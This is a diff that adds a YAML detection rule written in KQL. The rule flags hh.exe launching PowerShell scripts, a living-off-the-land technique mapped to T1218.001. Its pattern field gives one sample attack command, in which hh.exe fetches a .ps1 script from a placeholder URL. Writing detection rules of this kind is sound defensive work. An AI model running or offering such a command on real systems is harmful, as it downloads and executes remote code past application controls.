@@ -1,0 +1,33 @@
+---
+title: hh_pid_0001_executing_ps1
+intel:
+  description:
+    - open powershell script with HTML help
+  detectType: single_line_match
+  detectCon: 3
+  detectLanguage: kql
+  tags:
+    - lolbin
+  attackTechnique: t1218.001
+  attackSoftware:
+  references:
+  emulation:
+  pattern:
+    - HH.exe http://some.url/script.ps1
+dataRequirements:
+  dataSource: windows_os
+  dataType: process_creation
+  dataCollector: m365d_agent
+  dataForwardTo: m365d_security_center
+  dataParser:
+  dataStorage: m365d_security_center
+  dataTable: device_process_events
+  dataIndex:
+  dataAccess: api_advanced_hunting
+  dataMap:
+logic:
+  kqlVar:
+  kqlTable: DeviceProcessEvents
+  kqlQuery: | 
+    | where FileName =~ 'hh.exe'
+    | where ProcessCommandLine contains '.ps1'
